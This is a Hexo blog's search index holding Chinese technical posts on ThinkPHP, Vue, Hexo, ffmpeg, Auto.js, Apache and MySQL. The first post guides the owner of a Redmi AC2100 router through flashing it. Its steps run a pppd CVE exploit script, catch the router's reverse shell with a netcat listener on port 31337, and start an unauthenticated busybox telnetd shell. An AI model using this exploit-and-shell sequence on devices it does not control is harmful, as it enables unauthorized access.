@@ -1,0 +1,273 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>redmi路由rm2100刷机</title>
+    <url>/2020/05/10/redmi%E8%B7%AF%E7%94%B1rm2100%E5%88%B7%E6%9C%BA/</url>
+    <content><![CDATA[<p>最近听说redmi/xiaomi ac2100 路由很火，就入手了一个169的redmi ac2100。到手开箱的时候，第一感觉就是这东西颜值挺低的，外形来看，除了正面，其他三面各配两条天线，据说xiaomi ac2100为了妥协外观去掉了这六根天线。。。</p>
+<p>根据恩山论坛大佬的教程折腾了一晚上没成功，主要是卡在了pppoe这一步，路由死活连不上虚拟机的pppoe。具体教程：</p>
+<ol>
+<li><p>准备两条网线，一条短接wan口和旁边的lan口，另一条连接电脑相邻lan口</p>
+</li>
+<li><p>下载大佬配置好的ubuntu20虚拟机，锁屏密码是739870，里面装好python3环境也搭好pppoe服务了，用vmvare打开虚拟机。</p>
+</li>
+<li><p>在下载目录（大佬的虚拟机桌面点击haha开头的文件夹一路点到redmi目录）打开命令行窗口，运行</p>
+<pre><code>python3 -m http.server 8081 &amp;</code></pre><p> 建立http服务器。用手机看看 <a href="http://192.168.31.177:8081/" target="_blank" rel="noopener">http://192.168.31.177:8081/</a> 能否正常打开 ，不能打开就自行检查防火墙，再考虑后面的。这一步一定要在虚拟机检查一下是否能打开192.168.31.1，能进入小米路由管理页面就说明虚拟机和主机网卡桥接成功了。或者说如果你看到路由器的internet指示灯不亮（正常应该是黄色常亮的），那就检查一下网线是否插好，不亮灯肯定是没接上wan口的，多留意细节。</p>
+</li>
+<li><p>同样在下载目录打开窗口运行下面命令，这是开启pppoe的命令</p>
+<pre><code class="shell">sudo pppoe-server -I ens33 -L 192.168.5.1 -R 192.168.5.5 -N 10</code></pre>
+<p>路由器能拨上号后再考虑后面的。</p>
+<p>再次打开窗口，运行</p>
+<pre><code class="shell">nc -nvlp 31337</code></pre>
+<p>再次打开窗口，运行</p>
+<pre><code class="shell">sudo python3 pppd-cve.py </code></pre>
+<p>此时注意运行nc-nvlp 31337的窗口，一但收到连接立刻在nc的窗口里复制粘贴运行下面的代码（一定要先运行nc再运行python脚本），这里手速要快点，因为nc连上后会跳出命令。如果连接中途断开，则重复运行上面最后两步（指python和nc-nvlp两个窗口）。</p>
+<pre><code class="shell">cd /tmp&amp;&amp;wget http://192.168.31.177:8081/busybox&amp;&amp;chmod a+x ./busybox&amp;&amp;./busybox telnetd -l /bin/sh</code></pre>
+</li>
+<li><p>上诉操作完成后运行</p>
+<pre><code class="shell">telnet 192.168.31.1</code></pre>
+<p>再依次运行</p>
+<pre><code class="shell">wget http://192.168.31.177:8081/r3g.bin&amp;&amp;nvram set uart_en=1&amp;&amp;nvram set bootdelay=5&amp;&amp;nvram set flag_try_sys1_failed=1&amp;&amp;nvram commit</code></pre>
+<pre><code class="shell">mtd -r write r3g.bin kernel1</code></pre>
+<p>虽然不太懂这些代码，但大概猜出来是开启路由器telnet的，有了telnet就可以刷入固件了。</p>
+</li>
+<li><p>运行完成后会进入op(用户名root 密码admin)此时可切换到windows。如果拿不到ip，请手动设置有线网卡ip为192.168.1.23，网关为192.168.1.1，网关掩码255.255.255.0。winscp将老毛子固件传到tmp目录下，用putty之类的连路由器运行下面命令：</p>
+<pre><code>mtd -r write /tmp/redmi.trx kernel</code></pre><p>然后等待重启即可，管理后台192.168.2.1 帐号密码：admin admin 或者root admin</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>redmi ac2100</tag>
+        <tag>rm2100</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>thinkphp5吐槽总结</title>
+    <url>/2020/05/07/thinkphp5%E5%90%90%E6%A7%BD%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>一直都在用thinkphp，从3到5，相对于3来说，5确实是优化了不少东西，但也不免出现了很多鸡肋的写法。</p>
+<p>用了这么久tp5，自我感觉5的重构已经使tp完全变味了，从控制器、自定义标签到模型等等，特别是模型，从5开始已经彻底区分数据库操作和模型操作了，使得很多事件写法都含糊不清，数据库有数据库的事件，模型有模型的事件，各司其职。可能这样听起来是件好事，一旦用起来就矛盾重重了。</p>
+<ol>
+<li><p>查询事件只存在于数据库事件中，模型中只有数据删改增事件，这样会造成什么问题呢？数据库（Db）类是全局类，也就是说只要监听了Db事件，那就是全局事件了，也就是在所有模型都会起到作用，差不多就是俗称的全局污染了，这也是我最早发现的鸡肋问题，官方手册中也是含糊不清，官方对用户提问也是爱答不理。相较tp3，3的所有事件都归模型统一管理，模型又一一对应每个数据表，这样的话就不会有任何污染现象了，我觉得3这样的事件设计是相对合理的，要比5好用很多。</p>
+</li>
+<li><p>模型事件只能通过模型操作才能触发，一旦回到Db类模型事件就会失效（因为tp使用链表结构，并且model和Db类是相互继承绑定的，所以一不小心就会从model实例转化到Db实例），这也是严格区分Db和model之后的后遗症，准确来说是事件后遗症，如果能像tp3那样，所有事件都归由模型管理就好多了。现在为止Db事件我是一个都不敢用。</p>
+</li>
+<li><p>数据自动完成的神仙操作。先上图</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200507121404.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200507121438.png" srcset="/img/loading.gif" alt=""></p>
+<p>注意，$this-&gt;updata和$this-&gt;insert都是可以由开发者自定义的自动完成字段，而我真正希望的是update的字段就在update时完成，insert的字段就在insert时完成。但他在前面就setAttr了，也就是任何时候自动完成都会生效，这使得我们自定义的完成字段就变得毫无意义了。。。</p>
+</li>
+<li><p>模型验证和数据设置的神仙配合。继续上图</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200507122224.png" srcset="/img/loading.gif" alt=""></p>
+<p>这个鸡肋点在。。。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200507122631.png" srcset="/img/loading.gif" alt=""></p>
+<p>因为save里验证的是参数$data而不是模型属性$model-&gt;data，一旦使用$model-&gt;data($data)时，$model-&gt;save()这样的写法就不能自动验证。。至于为什么要用$model-&gt;data()。。。这个也说来话长，因为保存数据时tp会过滤掉一些空的、无效的或者说是没有变化元素，但有时候我们需要强制写入这样的数据，这时候使用$model-&gt;data($data,true)就能阻止框架过滤我们的数据了。。。</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>thinkphp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vue-router报错Unknown custom element router-view</title>
+    <url>/2020/04/02/vue-router%E6%8A%A5%E9%94%99Unknown-custom-element-router-view/</url>
+    <content><![CDATA[<p>很久没用过vue了，以前用得也不多，到现在差不多都忘光了。</p>
+<p>项目main.js</p>
+<pre><code class="vue">import Vue from &#39;vue&#39;
+import App from &#39;./App.vue&#39;
+import VueRouter from &quot;vue-router&quot;;
+
+const Foo = { template: &#39;&lt;div&gt;foo&lt;/div&gt;&#39; }
+const Bar = { template: &#39;&lt;div&gt;bar&lt;/div&gt;&#39; }
+const routes = [
+    {path: &#39;/Foo&#39;, component: Foo},
+    {path: &#39;/Bar&#39;, component: Bar}
+]
+const router = new VueRouter({
+    routes // (缩写) 相当于 routes: routes
+})
+
+Vue.config.productionTip = false
+new Vue({
+    render: h =&gt; h(App),
+    router,
+}).$mount(&#39;#app&#39;)</code></pre>
+<p>报错</p>
+<blockquote>
+<p>vue.runtime.esm.js?2b0e:619 [Vue warn]: Unknown custom element: <router-link> - did you register the component correctly? For recursive components, make sure to provide the “name” option.</p>
+<p>found in</p>
+<p>—&gt; <App> at src/App.vue<br>       <Root></p>
+</blockquote>
+<p>检索报错得知是没有<code>Vue.use(VueRouter)</code>把代码加入main.js即可</p>
+]]></content>
+      <tags>
+        <tag>vue</tag>
+        <tag>vue-router</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo博客多端写作</title>
+    <url>/2020/03/18/Hexo%E5%8D%9A%E5%AE%A2%E5%A4%9A%E7%AB%AF%E5%86%99%E4%BD%9C/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>总所周知，Hexo没有一个总的博文管理后台，而博客写作的前提是要拿到完整的hexo源代码，所以当我们处于新一台设备时，除非使用U盘拷贝随身携带，否则就没办法写作了。</p>
+<p>虽然可以借助U盘做到多端写作，但无疑拷贝粘贴这是一个很麻烦的过程，也难免会有忘记带U盘的情况。此时、我们会去想，有没有一个好用的 Hexo 多端同步方案来帮我们解决这些烦恼呢？答案是肯定的，我们可以使用github或者其他开源仓库进行版本控制实现多端写作</p>
+<h4 id="创建Github仓库分支"><a href="#创建Github仓库分支" class="headerlink" title="创建Github仓库分支"></a>创建Github仓库分支</h4><ol>
+<li><p>修改Hexo博客目录下的<code>.gitignore</code>文件，在末尾加上</p>
+<pre><code>/.deploy_git
+/public</code></pre><p>我是在idea编码，所以我还需要加一行</p>
+<pre><code> .idea</code></pre></li>
+<li><p>执行git命令 创建分支</p>
+<pre><code>git init                      # 初始化 git 仓库
+git remote add origin ${your github repository}
+# 添加 Github 远程仓库，其中：`[github repository]` 是你发布 Hexo 时所建立的仓库地址。比如：`git@github.com:d2gin/d2gin.github.io.git`
+git add .                     # 将变更添加到 git 暂存区
+git commit -m &quot;${comment}&quot;    # 提交本次更改，其中 ${comment} 是本次提交的说明，按照实际情况填写任意字符即可
+git push origin master:hexo # 将本地 master 分支的提交发布到远程仓库的 hexo 分支</code></pre><p>远程仓库中的 master 分支用于存储 hexo 生成的静态页面，hexo 分支用于存储 hexo 源文件；此时，我们已经成功将 Hexo 备份到了远程仓库的 hexo 分支。</p>
+<p>不要直接在github平台上创建分支，上述命令会自动创建分支。</p>
+</li>
+</ol>
+<h4 id="恢复安装"><a href="#恢复安装" class="headerlink" title="恢复安装"></a>恢复安装</h4><pre><code>新设备中创建准备存储源代码的目录，进入目录，依次执行以下命令：
+```
+git clone -b hexo [github repository] ./
+npm install
+```
+确保新设备已安装hexo-cli、hexo-deployer-git
+最后`hexo g`、`hexo s`</code></pre><h4 id="同步代码"><a href="#同步代码" class="headerlink" title="同步代码"></a>同步代码</h4><pre><code>- 在任意一个终端更新博客前执行 `git pull origin hexo` 拉取云端最新版本；
+- 在任意一个终端更新博客后依次执行
+```
+git add .
+git commit -m &quot;更新信息&quot;
+git push origin master:hexo
+```</code></pre>]]></content>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux下编译安装ffmpeg</title>
+    <url>/2020/03/18/linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85ffmpeg/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>现在最新的FFMPEG 他自带有音频和视频解码的库，可能是因为版权的一些问题，它没有自带编码音频和视频的库，另外，如果需要使用ffplay 进行视频播放，还需要安装SDL。下面介绍在linux 下，以H264 和 MP3 视音频编码 SDL显示为例的安装。现在我需要借助ffmpeg实现视频转gif，并加入字幕。</p>
+<h4 id="1、下载最新的安装代码。"><a href="#1、下载最新的安装代码。" class="headerlink" title="1、下载最新的安装代码。"></a>1、下载最新的安装代码。</h4><pre><code>LAME 音频编码：http://lame.sourceforge.net/download.php
+X264 视频编码 ：http://www.videolan.org/developers/x264.html
+SDL 显示库： http://www.libsdl.org/download-2.0.php
+ASS 字幕：http://www.linuxfromscratch.org/blfs/view/svn/multimedia/libass.html
+FFMPEG ： http://www.ffmpeg.org/download.html</code></pre><p>前面四项按需安装，因为我需要使用ffmpeg生成带字幕的gif图片，所以需要安装libass，但编译libass需要fribidi，所以需要编译Ass前需要安装一个fribidi：<a href="http://www.linuxfromscratch.org/blfs/view/svn/general/fribidi.html" target="_blank" rel="noopener">http://www.linuxfromscratch.org/blfs/view/svn/general/fribidi.html</a></p>
+<h4 id="2、-安装MP3编码库"><a href="#2、-安装MP3编码库" class="headerlink" title="2、 安装MP3编码库"></a>2、 安装MP3编码库</h4><pre><code class="shell">./configure
+make
+make install</code></pre>
+<h4 id="3、安装X264视频编码库"><a href="#3、安装X264视频编码库" class="headerlink" title="3、安装X264视频编码库"></a>3、安装X264视频编码库</h4><pre><code class="shell">./configure --enable-shared
+make
+make install</code></pre>
+<p>如果安装过程中提示yasm版本过低，可以使用 ./configure –enable-shared –disable-asm 关闭yasm，然后再安装。也可以自己先升级yasm后再安装。</p>
+<h4 id="4、SDL显示安装"><a href="#4、SDL显示安装" class="headerlink" title="4、SDL显示安装"></a>4、SDL显示安装</h4><pre><code class="shell">./configure
+make
+make install</code></pre>
+<h4 id="5、安装fribidi依赖"><a href="#5、安装fribidi依赖" class="headerlink" title="5、安装fribidi依赖"></a>5、安装fribidi依赖</h4><pre><code class="shell">./configure --prefix=/usr/local/ --enable-shared
+make
+make install</code></pre>
+<p>安装fribidi完后需要把fribidi的<code>fribidi/lib/pkgconfig</code>目录添加到环境变量PCK_CONFIG_PATH中去<code>export PKG_CONFIG_PATH=&quot;/usr/lib/pkgconfig:/usr/local/lib/pkgconfig:/root/soft/ffmpeg/lib/pkgconfig:/root/soft/fribidi/lib/pkgconfig&quot;</code></p>
+<h4 id="6、安装libass"><a href="#6、安装libass" class="headerlink" title="6、安装libass"></a>6、安装libass</h4><pre><code class="shell">./configure --prefix=/usr --disable-static
+make
+make install</code></pre>
+<h4 id="7、安装FFMPEG"><a href="#7、安装FFMPEG" class="headerlink" title="7、安装FFMPEG"></a>7、安装FFMPEG</h4><pre><code class="shell">./configure --enable-libmp3lame --enable-libx264 --enable-gpl --enable-libass
+make
+make install</code></pre>
+<p>如果执行ffmpeg出现类似<code>ffmpeg: error while loading shared libraries: libass.so.9: cannot open shared object file: No such file or directory</code>的提示，只需要在<code>/etc/ld.so.conf</code>文件后添加一行<code>/usr/local/lib</code>即可</p>
+<h4 id="8、测试FFMPEG"><a href="#8、测试FFMPEG" class="headerlink" title="8、测试FFMPEG"></a>8、测试FFMPEG</h4><pre><code class="shell">ffmpeg -h</code></pre>
+<img src="/2020/03/18/linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85ffmpeg/20200318104132.png" srcset="/img/loading.gif" class="" title="执行结果">]]></content>
+      <tags>
+        <tag>linux</tag>
+        <tag>ffmpeg</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在vscode开发autojs脚本、调出控制台</title>
+    <url>/2020/03/13/%E5%9C%A8vscode%E5%BC%80%E5%8F%91autojs%E8%84%9A%E6%9C%AC%E3%80%81%E8%B0%83%E5%87%BA%E6%8E%A7%E5%88%B6%E5%8F%B0/</url>
+    <content><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在VS Code中菜单”查看”-&gt;“扩展”-&gt;输入”Auto.js”或”hyb1996”搜索，即可看到”Auto.js-VSCodeExt”插件，安装即可。插件的更新也可以在这里更新。</p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h4><p>按 <code>Ctrl+Shift+P</code> 或点击”查看”-&gt;”命令面板”可调出命令面板，输入 <code>Auto.js</code> 可以看到几个命令，移动光标到命令<code>Auto.js: Start Server</code>，按回车键执行该命令。</p>
+<p>此时VS Code会在右上角显示”Auto.js server running”，即开启服务成功。</p>
+<p>打开新的项目，会掉线，需要重新run一下。只有保证这一步成功了，后面才能进行。</p>
+<h4 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h4><p>将手机连接到电脑启用的Wifi或者同一局域网中。通过命令行ipconfig(或者其他操作系统的相同功能命令)查看电脑的IP地址。在手机上的Auto.js的侧拉菜单中启用调试服务，并输入IP地址，等待连接成功。</p>
+<h4 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h4><p>之后就可以在电脑上编辑JavaScript文件并通过命令<strong>Run</strong>或者<strong>按键F5</strong>在手机上运行了。</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>按 <code>Ctrl+Shift+P</code> 或点击”查看”-&gt;”命令面板”可调出命令面板，输入 Auto.js 可以看到几个命令：</p>
+<p><strong>Run</strong> 运行当前编辑器的脚本。如果有多个设备连接，则在所有设备运行。这里的运行脚本，无非是是把单个文件放到手机Auto.js的文件根目录下环境下运行（并不是实际挪移）。所以，如果有脚本依赖的话，需要把被依赖的脚本拷贝到手机上（下面有更简单的解决方案）。否则会报错。<br><strong>Save</strong> 保存当前文件到手机的脚本默认目录（文件名会加上前缀remote)。如果有多个设备连接，则在所有设备保存。这个命令只能保存单个文件，不能保存文件夹。并且，文件只能保存到手机上脚本的默认根目录。<br><strong>Run Project</strong>（运行项目）：运行一个项目，需要Auto.js 4.0.4Alpha5以上支持。这个命令比起Run，相当于是把整个项目，包括各种文件夹各种依赖一起放到手机根目录环境下运行而已。不需要拷贝整个项目，就可以run整个项目。更好的方式就是用这个命令运行整个项目。<br><strong>New Project</strong>（新建项目）：选择一个空文件夹（或者在文件管理器中新建一个空文件夹），将会自动创建一个项目。新建项目只是在电脑上新建，和打开电脑上原有的项目是一样的。<br><strong>Save Project</strong>（保存项目）：保存一个项目，需要Auto.js 4.0.4Alpha5以上支持。保存整个项目到手机根目录。<br><strong>Start Server</strong> 启动插件服务。之后在确保手机和电脑在同一区域网的情况下，在Auto.js的侧拉菜单中使用连接电脑功能连接。<br><strong>Stop Server</strong> 停止插件服务。<br><strong>Rerun</strong> 停止当前文件对应的脚本并重新运行。如果有多个设备连接，则在所有设备重新运行。<br><strong>Stop</strong> 停止当前文件对应的脚本。如果有多个设备连接，则在所有设备停止。<br><strong>StopAll</strong> 停止所有正在运行的脚本。如果有多个设备连接，则在所有设备运行所有脚本。<br><strong>RunOnDevice</strong> 弹出设备菜单并在指定设备运行脚本。<br><strong>SaveToDevice</strong> 弹出设备菜单并在指定设备保存脚本。<br>以上命令一些有对应的快捷键，参照命令后面的说明即可。</p>
+<p>所以，比较顺的思路就是用vs code在电脑上打开已有文件夹。然后修改代码之后，使用<strong>Run Project</strong>来运行整个项目，等调整满意了，再使用<strong>Save Project</strong>命令拷贝到手机。当然，如果是单文件或者说没有依赖的话，直接用<strong>Run</strong>和<strong>Save</strong>也是不错的选择。</p>
+<h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>要显示来自Auto.js的日志，打开 VS Code上面菜单的”帮助”-&gt;“切换开发人员工具”-&gt;”Console”即可。</p>
+]]></content>
+      <tags>
+        <tag>vscode</tag>
+        <tag>autojs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache error 504 Gateway Timeout</title>
+    <url>/2020/03/07/Apache-error-504-Gateway-Timeout/</url>
+    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>CentOS 下 Oneinstack 安装 Apache + Mysql + PHP7</p>
+<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>一个 PHP 脚本需要长时间执行，执行超出 60 秒即返回 Http 504 Gateway Timeout</p>
+<p>类似像这样的代码脚本执行，就会报错</p>
+<pre><code>&lt;?php
+echo date(&#39;h:i:s&#39;) . &quot;&lt;br&gt;&quot;;
+sleep(120);
+echo date(&#39;h:i:s&#39;);
+?&gt;</code></pre><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>不知为何，此版本 Oneinstack 安装后，需要在 Httpd.conf 中添加：<br><code>Timeout 600</code><br>600 的单位是秒，根据实际需要设置，设置后重启 Httpd 服务</p>
+<h2 id="另一个问题"><a href="#另一个问题" class="headerlink" title="另一个问题"></a>另一个问题</h2><p>按如上设置后，504 问题解决，产生新的 503 错误</p>
+<h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><pre><code>/usr/local/php/conf/etc/php-fpm.conf`
+其中的更改为
+`request_terminate_timeout = 0</code></pre>]]></content>
+      <tags>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>实用工具集</title>
+    <url>/2020/03/06/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
+    <content><![CDATA[<p>php无扩展分词</p>
+<pre><code>composer require itplato/phpanalysis</code></pre><p>php 中文工具</p>
+<pre><code>composer require yurunsoft/chinese-util</code></pre>]]></content>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>备忘录20200306</title>
+    <url>/2020/03/06/%E5%A4%87%E5%BF%98%E5%BD%9520200306/</url>
+    <content><![CDATA[<h3 id="2020-03-06"><a href="#2020-03-06" class="headerlink" title="2020/03/06"></a>2020/03/06</h3><h4 id="大数据优化"><a href="#大数据优化" class="headerlink" title="大数据优化"></a>大数据优化</h4><ol>
+<li>帖 <a href="https://www.v2ex.com/t/573269、https://zhuanlan.zhihu.com/p/98135840、https://www.v2ex.com/t/81531" target="_blank" rel="noopener">https://www.v2ex.com/t/573269、https://zhuanlan.zhihu.com/p/98135840、https://www.v2ex.com/t/81531</a></li>
+<li>工具hadoop、OLAP、Druid、apache kylin、clickhouse</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>备忘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql--Innodb和Myisam概念与数据恢复</title>
+    <url>/2020/03/06/Mysql-Innodb%E5%92%8CMyisam%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D/</url>
+    <content><![CDATA[<p>Innodb和Myisam是Mysql常见的两种数据存储引擎。没有研究过Oracle、SQL Server等数据库，所以下面只针对Mysql。</p>
+<p><strong>一、两种方式的数据存储结构：</strong></p>
+<p>　　在Myisam下，数据库的每个数据表都有<em>.frm、</em>.YMI和<em>.YMD三个文件，其中</em>.frm存储数据表的表结构，<em>.MYI存储数据表的索引，</em>.MYD存数数据表的记录数据；</p>
+<p>　　在Innodb下，每个数据库下的每个数据表只有一个*.frm存储数据表的表结构，而所有数据库的所有表数据索引、数据记录都全部存储在ibdata1文件中，而ib_logfile0和ib_logfile1是日志文件。</p>
+<p><strong>二、数据导入和恢复：</strong></p>
+<p>Case1 Myisam =》 Myisam：</p>
+<p>　　由于Myisam的数据表结构、索引、记录数据等信息分别存储在<em>.frm、</em>.MYI和*.MYD文件中，所以只需要将源数据库数据表的相应三个文件复制到对应目的数据库文件夹下就可以了。</p>
+<p>　　但是如果只有*.frm（假设test.frm）了，那么可以将test.frm复制到对应的数据库目录（假设tmp数据库）之后，在tmp目录下，新建test.MYI和test.MYD文件。此时通过“show tables;”可以看到有test表，但是查看表的数据，如“desc test;”，此时报错无法查看，因为只有test.frm有数据，而test.MYI和test.MYD是新建的无效文件。然后可以通过Mysql自带修复操作“REPAIRTABLE test USE_FRM”修复数据表，然后就可以查看表的数据，但是为空（因为test.frm中不包含数据）。</p>
+<p>Case2 Innodb =》 Innodb：</p>
+<p>　　由于Innodb下，表结构存在<em>.frm文件，但是表的数据存储在ibdata1文件中，所以导入时，除了复制</em>.frm，还要复制源Mysql的data目录下的ibdata1，替换掉目的数据库的ibdata，如果目的数据库中有已存在的其他数据库，此时需要先备份目的数据库的原先data数据，然后将新导入的表格通过其他方式导出，然后在还原原先的data数据，将新导出的数据导入。</p>
+<p>　　如果只有*.frm（假设test.frm），没有有效的ibdata1，那么也只能恢复表的结构。先将test.frm复制到另一个数据库中（假设tmp），然后在tmp下新建一个Innodb型的数据表test（有哪些字段不重要），不要添加任何记录。然后将要恢复的test.frm复制到test目录下替代新建test表产生的test.frm，重启mysql之后，新建的test表的结构就和要恢复的test表结构相同</p>
+<p>Case3 Myisam =》 Innodb 和 Innodb =》 Myisam：</p>
+<p>　　如果有<em>.frm、</em>.MYI和*.MYD三个文件，可以通过Case1的方法导入之后，重新导出sql或者其他文件，也可以导入后修改为Innodb，之后通过Case2方式。同样Innodb =》 Myisam的操作类似。</p>
+<p>　　对于数据库的数据，除了从.frm文件恢复之外，如果有日志文件，从日志文件恢复也是一个一个选择。但是对于数据库，进行移植或这更换系统时，最好还是通过导入导出工具到处相应的sql语句文件。</p>
+<p><strong>三、Innodb和Myisam其他区别：</strong></p>
+<p>　　1、Myisam多个数据库和数据表的记录数据是分文件存储的，而Innodb所有表的记录数据都存储在ibdata1文件中，所以当数据表记录比较少，单个表的数据文件比较少时，此时使用Myisam性能会略好于Innodb。但是如果表的数据记录非常多，此时使用Innodb的性能会远远高于Myisam，通过测试可以发现，随着表的记录增加，Innodb的性能降低很少，而Myisam的性能则迅速降低。</p>
+<p>　　2、Innodb支持事务操作，而Myisam不支持事务操作。</p>
+<p>　　事务操作：就是一组多条sql指令作为一个整体，可以并发操作，但是关键点在于事务内的多个操作必须同时执行完才会提交结果。所以事务内的SQL要么都不做，要么都做。</p>
+<p>　　事务实现一般有下面两种方式：</p>
+<p>　　Way1 begin、rollback和commit：</p>
+<p>　　begin表示开始事务，rollback表示事务回滚，commit表示事务提交。</p>
+<p>　　Way2 通过set来改变Mysql默认的自动提交模式：</p>
+<p>　　set autocommit=0 禁止自动提交（使用事务，此时每条SQL都会当作事务，必须显示使用commit体提交结果或者rollback撤销结果）<br>　　set autocommit=1 开启自动提交（禁用事务）</p>
+]]></content>
+      <tags>
+        <tag>数据库</tag>
+        <tag>mysql</tag>
+      </tags>
+  </entry>
+</search>
